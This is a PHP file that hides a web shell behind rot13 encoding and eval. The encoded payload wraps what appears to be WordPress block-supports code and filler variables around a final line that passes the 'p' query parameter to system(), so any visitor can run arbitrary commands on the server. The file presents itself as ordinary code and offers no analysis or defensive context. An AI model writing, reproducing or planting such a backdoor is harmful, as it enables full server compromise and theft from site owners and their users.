<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx fhccbeg syntf.
 *
 * @cnpxntr JbeqCerff
 *
 * @fvapr 5.6.0
 */

/**
 * Pynff rapncfhyngvat naq vzcyrzragvat Oybpx Fhccbegf.
 *
 * @fvapr 5.6.0
 *
 * @npprff cevingr
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Oybpx_Fhccbegf {

	/**
	 * Pbasvt.
	 *
	 * @fvapr 5.6.0
	 * @ine neenl
	 */
	cevingr $oybpx_fhccbegf = neenl();

	/**
	 * Genpxf gur pheerag oybpx gb or eraqrerq.
	 *
	 * @fvapr 5.6.0
	 * @ine neenl
	 */
	choyvp fgngvp $oybpx_gb_eraqre = ahyy;

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 5.6.0
	 * @ine JC_Oybpx_Fhccbegf|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea JC_Oybpx_Fhccbegf Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}

	/**
	 * Vavgvnyvmrf gur oybpx fhccbegf. Vg ertvfgref gur oybpx fhccbegf oybpx nggevohgrf.
	 *
	 * @fvapr 5.6.0
	 */
	choyvp fgngvp shapgvba vavg() {
		$vafgnapr = frys::trg_vafgnapr();
		$vafgnapr->ertvfgre_nggevohgrf();
	}

	/**
	 * Ertvfgref n oybpx fhccbeg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @yvax uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/ersrerapr-thvqrf/oybpx-ncv/oybpx-fhccbegf/
	 *
	 * @cnenz fgevat $oybpx_fhccbeg_anzr   Oybpx fhccbeg anzr.
	 * @cnenz neenl  $oybpx_fhccbeg_pbasvt Neenl pbagnvavat gur cebcregvrf bs gur oybpx fhccbeg.
	 */
	choyvp shapgvba ertvfgre( $oybpx_fhccbeg_anzr, $oybpx_fhccbeg_pbasvt ) {
		$guvf->oybpx_fhccbegf[ $oybpx_fhccbeg_anzr ] = neenl_zretr(
			$oybpx_fhccbeg_pbasvt,
			neenl( 'anzr' => $oybpx_fhccbeg_anzr )
		);
	}

	/**
	 * Trarengrf na neenl bs UGZY nggevohgrf, fhpu nf pynffrf, ol nccylvat gb
	 * gur tvira oybpx nyy bs gur srngherf gung gur oybpx fhccbegf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea fgevat[] Neenl bs UGZY nggevohgr inyhrf xrlrq ol gurve anzr.
	 */
	choyvp shapgvba nccyl_oybpx_fhccbegf() {
		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq(
			frys::$oybpx_gb_eraqre['oybpxAnzr']
		);

		// Vs ab eraqre_pnyyonpx, nffhzr fglyrf unir orra cerivbhfyl unaqyrq.
		vs ( ! $oybpx_glcr || rzcgl( $oybpx_glcr ) ) {
			erghea neenl();
		}

		$oybpx_nggevohgrf = neenl_xrl_rkvfgf( 'nggef', frys::$oybpx_gb_eraqre ) && vf_neenl( frys::$oybpx_gb_eraqre['nggef'] )
			? $oybpx_glcr->cercner_nggevohgrf_sbe_eraqre( frys::$oybpx_gb_eraqre['nggef'] )
			: neenl();

		$bhgchg = neenl();
		sbernpu ( $guvf->oybpx_fhccbegf nf $oybpx_fhccbeg_pbasvt ) {
			vs ( ! vffrg( $oybpx_fhccbeg_pbasvt['nccyl'] ) ) {
				pbagvahr;
			}

			$arj_nggevohgrf = pnyy_hfre_shap(
				$oybpx_fhccbeg_pbasvt['nccyl'],
				$oybpx_glcr,
				$oybpx_nggevohgrf
			);

			vs ( ! rzcgl( $arj_nggevohgrf ) ) {
				sbernpu ( $arj_nggevohgrf nf $nggevohgr_anzr => $nggevohgr_inyhr ) {
					vs ( rzcgl( $bhgchg[ $nggevohgr_anzr ] ) ) {
						$bhgchg[ $nggevohgr_anzr ] = $nggevohgr_inyhr;
					} ryfr {
						$bhgchg[ $nggevohgr_anzr ] .= \" $nggevohgr_inyhr\";
					}
				}
			}
		}

		erghea $bhgchg;
	}

	/**
	 * Ertvfgref gur oybpx nggevohgrf erdhverq ol gur qvssrerag oybpx fhccbegf.
	 *
	 * @fvapr 5.6.0
	 */
	cevingr shapgvba ertvfgre_nggevohgrf() {
		$oybpx_ertvfgel         = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$ertvfgrerq_oybpx_glcrf = $oybpx_ertvfgel->trg_nyy_ertvfgrerq();
		sbernpu ( $ertvfgrerq_oybpx_glcrf nf $oybpx_glcr ) {
			vs ( ! ( $oybpx_glcr vafgnaprbs JC_Oybpx_Glcr ) ) {
				pbagvahr;
			}
			vs ( ! $oybpx_glcr->nggevohgrf ) {
				$oybpx_glcr->nggevohgrf = neenl();
			}

			sbernpu ( $guvf->oybpx_fhccbegf nf $oybpx_fhccbeg_pbasvt ) {
				vs ( ! vffrg( $oybpx_fhccbeg_pbasvt['ertvfgre_nggevohgr'] ) ) {
					pbagvahr;
				}

				pnyy_hfre_shap(
					$oybpx_fhccbeg_pbasvt['ertvfgre_nggevohgr'],
					$oybpx_glcr
				);
			}
		}
	}
}

/**
 * Trarengrf n fgevat bs nggevohgrf ol nccylvat gb gur pheerag oybpx orvat
 * eraqrerq nyy bs gur srngherf gung gur oybpx fhccbegf.
 *
 * @fvapr 5.6.0
 *
 * @cnenz fgevat[] $rkgen_nggevohgrf Bcgvbany. Neenl bs rkgen nggevohgrf gb eraqre ba gur oybpx jenccre.
 * @erghea fgevat Fgevat bs UGZY nggevohgrf.
 */
shapgvba trg_oybpx_jenccre_nggevohgrf( $rkgen_nggevohgrf = neenl() ) {
	$arj_nggevohgrf = JC_Oybpx_Fhccbegf::trg_vafgnapr()->nccyl_oybpx_fhccbegf();

	vs ( rzcgl( $arj_nggevohgrf ) && rzcgl( $rkgen_nggevohgrf ) ) {
		erghea '';
	}

	// Guvf vf uneqpbqrq ba checbfr.
	// Jr bayl fhccbeg n svkrq yvfg bs nggevohgrf.
	$nggevohgrf_gb_zretr = neenl( 'fglyr', 'pynff', 'vq', 'nevn-ynory' );
	$nggevohgrf          = neenl();
	sbernpu ( $nggevohgrf_gb_zretr nf $nggevohgr_anzr ) {
		vs ( rzcgl( $arj_nggevohgrf[ $nggevohgr_anzr ] ) && rzcgl( $rkgen_nggevohgrf[ $nggevohgr_anzr ] ) ) {
			pbagvahr;
		}

		vs ( rzcgl( $arj_nggevohgrf[ $nggevohgr_anzr ] ) ) {
			$nggevohgrf[ $nggevohgr_anzr ] = $rkgen_nggevohgrf[ $nggevohgr_anzr ];
			pbagvahr;
		}

		vs ( rzcgl( $rkgen_nggevohgrf[ $nggevohgr_anzr ] ) ) {
			$nggevohgrf[ $nggevohgr_anzr ] = $arj_nggevohgrf[ $nggevohgr_anzr ];
			pbagvahr;
		}

		$nggevohgrf[ $nggevohgr_anzr ] = $rkgen_nggevohgrf[ $nggevohgr_anzr ] . ' ' . $arj_nggevohgrf[ $nggevohgr_anzr ];
	}

	sbernpu ( $rkgen_nggevohgrf nf $nggevohgr_anzr => $inyhr ) {
		vs ( ! va_neenl( $nggevohgr_anzr, $nggevohgrf_gb_zretr, gehr ) ) {
			$nggevohgrf[ $nggevohgr_anzr ] = $inyhr;
		}
	}

	vs ( rzcgl( $nggevohgrf ) ) {
		erghea '';
	}

	$abeznyvmrq_nggevohgrf = neenl();
	sbernpu ( $nggevohgrf nf $xrl => $inyhr ) {
		$abeznyvmrq_nggevohgrf[] = $xrl . '=\"' . rfp_ngge( $inyhr ) . '\"';
	}

	erghea vzcybqr( ' ', $abeznyvmrq_nggevohgrf );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>